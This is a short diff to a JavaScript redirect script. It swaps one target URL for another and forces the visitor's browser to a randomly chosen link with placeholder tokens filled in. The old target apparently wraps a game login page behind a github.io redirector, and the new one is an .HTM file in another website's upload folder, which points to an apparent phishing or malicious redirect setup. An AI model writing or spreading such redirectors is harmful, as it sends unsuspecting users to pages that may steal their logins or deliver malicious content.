@@ -7,7 +7,7 @@ function leleua() {
 }
 
 var urls=[
-'https://ccffq.github.io/ff.html?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html/&{nnnnnnnnnnn}{wwwwww}',
+'https://www.360tianma.com/public/upload/conf/2024/01-11/38db6050a87abdd15393b354437fedc5.HTM#{nnnnnnnnnnn}{wwwwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
